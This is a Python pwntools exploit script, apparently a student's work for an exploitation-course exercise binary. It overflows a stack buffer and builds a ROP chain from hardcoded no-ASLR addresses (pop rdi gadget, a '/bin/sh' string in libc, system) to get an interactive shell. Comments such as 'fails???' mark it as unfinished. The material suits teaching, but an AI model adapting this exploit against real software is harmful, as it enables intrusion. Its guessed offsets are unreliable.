#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
from advancedpwn import ida

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

context.binary = exe
context.log_level = "critical"

def signal_handler(signum, frame):
    global proxy
    if proxy is not None:
        proxy.exit_process()
        log.info("Killed IDA debugger window!")
    exit(0)

signal.signal(signal.SIGINT, signal_handler)  # Add IDA killer to process kill

def exploitStart():
    global proxy
    proxy = None
    r = context.binary.process()
    proxy = ida.attach(r, "192.168.127.1", ida_start_port=31337, binary_path=context.binary.path)
    #===========================================================
    #                    EXPLOIT GOES HERE
    #===========================================================
    # You can now communicate with the process, e.g.,
    # p.sendline("AAAAA")
    # p.recvline()
    print(cyclic_find(0x6261616A)) # 136
    r.sendline(b"ABCD") # Not sure why this helps?
    # Do the rop chain
    buf_start = 0x07FFFFFFFDD70 # as NOASLR always the same
    get_msg_add = 0x00555555555215
    rop = ROP(exe)
    gm_text_addr = rop.resolve("get_message")
    text_base = get_msg_add-gm_text_addr
    print(f"text_base: {hex(text_base)}")
    # do it now
    #rop(rdi=buf_start) # does not work as it's only text offset
    # align stack and move pointer to rdi
    xor_poprdi_poprbp = 0x11d3
    start_main_add = 0x1555553410B3 - 0xf3 # no ASLR or PIE? TODO LOL, not sure this will work on grading machine
    str_bin_sh = start_main_add + 0x1905ea
    rop.raw(text_base + xor_poprdi_poprbp)
    #unused_add = 0x011C9
    #rop.raw(text_base + unused_add)
    #rop.raw(buf_start)  # pop rdi
    rop.raw(str_bin_sh) # pop rdi directly into libc
    rop.raw(0x07FFFFFFFDD80)     # pop rbp
    pop_rsi_pop_add = 0x0000000000001321 # pop rsi; pop r15; ret;
    rop.raw(text_base + pop_rsi_pop_add)
    rop.raw(0x0) # zero them out
    rop.raw(0x0)
    rop.raw(text_base + 0x000000000000101a) # alignment ret
    system_add = start_main_add + 0x2e450
    rop.raw(system_add) # --> fails???
    #exit_add = start_main_add + 0x22c00
    #rop.raw(exit_add) # --> works
    #execve_add = start_main_add + 0xbf330
    #rop.raw(execve_add) # --> not sure what it helps
    #rop.raw(text_base + 0x000000000000101a) # alignment ret
    #rop.raw(system_add) # Valid return for the system --> works
    rop.raw(get_msg_add) # Valid return for the system --> works
    print(rop.dump())
    
    # Send rop chain
    raw_rop = rop.chain()
    cat_flag  = b"/bin/bash\x00"
    r.sendline(b"\x00"*8 + cat_flag*4 + cyclic(128-len(cat_flag*4)) + raw_rop)
    r.interactive()


if __name__ == '__main__':
    exploitStart()